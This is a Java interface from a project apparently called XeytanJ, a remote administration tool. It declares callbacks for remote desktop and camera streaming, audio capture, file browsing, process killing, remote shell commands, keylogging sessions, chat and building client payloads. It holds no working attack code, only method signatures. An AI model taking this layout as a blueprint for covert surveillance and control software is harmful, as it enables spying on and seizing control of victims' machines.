package com.melardev.xeytanj;

import com.melardev.xeytanj.enums.Language;
import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.enums.ServiceType;
import com.melardev.xeytanj.gui.main.MainUiListener;
import com.melardev.xeytanj.models.*;
import com.melardev.xeytanj.services.net.RemoteClient;

import javax.swing.*;
import java.util.List;
import java.util.Map;

public interface IApplication extends MainUiListener {
    void onDisposeError(String message);

    void run();

    void onClientLoggedIn(RemoteClient client);

    void onClientDisconnected(RemoteClient client);

    void onClientPresented(RemoteClient client, Map<String, String> env, Map<String, String> properties);

    void onCameraSessionClosed(RemoteClient remoteClientFromId);

    void onRemoteCameraPlayRequested(Client id, NetworkProtocol protocol, int cameraId, boolean muteAudio, int interval);

    void onRemoteDesktopInfoReceived(RemoteClient remoteClient, ImageIcon packet);

    void onRemoteDesktopConfigInfoReceived(RemoteClient remoteClientFromId, List<ScreenDeviceInfo> config);

    void onRemoteDesktopPauseRequested(Client client);

    void onRemoteDesktopPlayRequested(Client client, NetworkProtocol networkProtocol, String displayName, int scaleX, int scaleY, int delay);

    void onRemoteDesktopStopRequested(Client client);

    void onRemoteDesktopSessionClosed(RemoteClient remoteClient);

    void onRemoteCameraConfigInfoReceived(RemoteClient remoteClient, List<CameraDeviceInfo> cameraIds);

    void onCameraPacketReceived(RemoteClient remoteClient, Icon image);

    void onFilesystemRootInfoReceived(RemoteClient remoteClient, FileInfoStructure[] fileInfoStructures);

    void onFileSystemPathRequested(Client client, String fileSystemPath);

    void onFileSystemInfoUpdate(RemoteClient remoteClient, FileInfoStructure[] fileInfoStructures);

    void onClientReadyForShell(RemoteClient remoteClientFromId);

    void onKeylogSessionClosed(RemoteClient remoteClientFromId);

    void onWindowUserOwnedClosed(Client client, ServiceType gui);

    void onProcessInfoReceived(RemoteClient remoteClient, List<ProcessStructure> processStructures);

    void onProcessKillRequest(Client client, int pid);

    void onSendShellCommandRequested(Client client, String command);

    void onClientShellInfoReceived(RemoteClient remoteClientFromId, String output);

    void onShellSessionClosedByUser(RemoteClient remoteClientFromId);

    void onProcessSessionClosed(RemoteClient remoteClient);

    void onClientReadyForFileExplorerSession(RemoteClient remoteClientFromId);

    void onCameraAudioPacketReceived(RemoteClient remoteClientFromId, byte[] data, int bytesRead);

    void onAudioFileReceived(RemoteClient remoteClientFromId, byte[] data);

    void onCameraPauseRequested(Client client);

    void onSendChatMessage(Client client, String text);

    void onChatMessageReceived(RemoteClient remoteClient, String message);

    void onChatClosed(RemoteClient remoteClient);

    void onClientReadyForChat(RemoteClient remoteClientFromId);

    void onDisclaimerAccepted();

    void onDisclaimerRefused();

    void onLanguageSelected(Language lang);

    void onLanguageUiClosed();

    void onBuildClientRequested(BuildClientInfoStructure buildClientInfoStructure);

    void onShowMapRequested();


}
